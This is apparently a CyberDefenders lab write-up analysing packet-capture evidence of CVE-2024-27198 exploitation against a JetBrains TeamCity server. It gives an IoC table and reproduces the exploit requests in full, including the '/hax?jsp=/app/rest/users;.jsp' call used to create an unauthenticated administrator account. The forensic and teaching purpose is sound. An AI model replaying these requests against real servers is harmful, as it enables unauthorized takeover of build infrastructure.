# JetBrains TeamCity CVE-2024-27198 Authentication Bypass — CyberDefenders Writeup

**Category:** Network Forensics / Web Vulnerability Analysis  
**Platform:** CyberDefenders  
**Vulnerability:** CVE-2024-27198 (JetBrains TeamCity Authentication Bypass)  
**Tools:** Wireshark, HTTP Stream Analysis  

---

## Connected Investigations
- **Web Application Exploitation:** Compare with [CyberDefenders: XXE Infiltration Lab](<../XXE Infiltration Lab/Writeup.md>), analyzing web injection leading to credential theft and code execution.
- **Network Forensic Triage:** Compare with [CyberDefenders: Tomcat Takeover Lab](<../Tomcat Takeover Lab/README.md>) for web server compromise investigation.

---

## Vulnerability Overview

**CVE-2024-27198** is a critical authentication bypass vulnerability affecting JetBrains TeamCity web servers prior to version `2023.11.4`. The vulnerability stems from an alternate path issue in the TeamCity web request processing pipeline: by appending a `.jsp` path via the `?jsp=` query parameter (e.g. `/hax?jsp=/app/rest/server;.jsp`), requests bypass authentication checks enforced by the Spring security interceptor and are dispatched directly to the REST API servlet with unauthenticated administrative privileges.

---

## Walkthrough & Traffic Analysis

### 1. Identifying the Exploit Pattern in Packet Capture

Inspecting HTTP traffic in `Capture.pcap` and following TCP Stream `365`:

![Wireshark HTTP stream showing CVE-2024-27198 exploitation](images/Pasted%20image%2020260724204331.png)

```http
GET /hax?jsp=/app/rest/server;.jsp HTTP/1.1
Host: 3.71.79.4:8111
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 ...
Accept: */*
```

---

### 2. Extracting Target & Version Information

The unauthenticated response from the TeamCity server returns internal server metadata in XML format:

```xml
HTTP/1.1 200 
TeamCity-Node-Id: MAIN_SERVER
Content-Type: application/xml;charset=ISO-8859-1

<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<server version="2023.11.3" (build 147512)" 
        versionMajor="2023" versionMinor="11" 
        startTime="20240630T072354+0000" currentTime="20240630T080249+0000" 
        buildNumber="147512" buildDate="20240129T000000+0000" 
        internalId="5e3d6164-50f8-4941-8f09-20abc3f33337" role="main_node" 
        webUrl="http://localhost:8111" ... />
```

- **Target IP & Port:** `3.71.79.4:8111`
- **Vulnerable Server Version:** `2023.11.3` (Build `147512`)
- **Server Node ID:** `MAIN_SERVER`

---

### 3. Administrator Account Creation Attempt

Immediately following the reconnaissance request, the stream captures an unauthenticated POST request to the `/app/rest/users` endpoint:

```http
POST /hax?jsp=/app/rest/users;.jsp HTTP/1.1
Host: 3.71.79.4:8111
Content-Type: application/json
```

**Analysis:** The adversary leverages the authentication bypass to issue REST API calls that generate a new administrator account on the TeamCity controller, achieving complete remote server takeover.

---

## Key Indicators of Compromise (IoCs)

| Field / Attribute | Value |
| :--- | :--- |
| **Vulnerability** | CVE-2024-27198 |
| **Target Server IP** | `3.71.79.4` |
| **Target Service Port** | `8111` (TeamCity Web UI / REST) |
| **Software Version** | JetBrains TeamCity `2023.11.3` |
| **Exploit URI Pattern** | `/hax?jsp=/app/rest/server;.jsp` & `/hax?jsp=/app/rest/users;.jsp` |
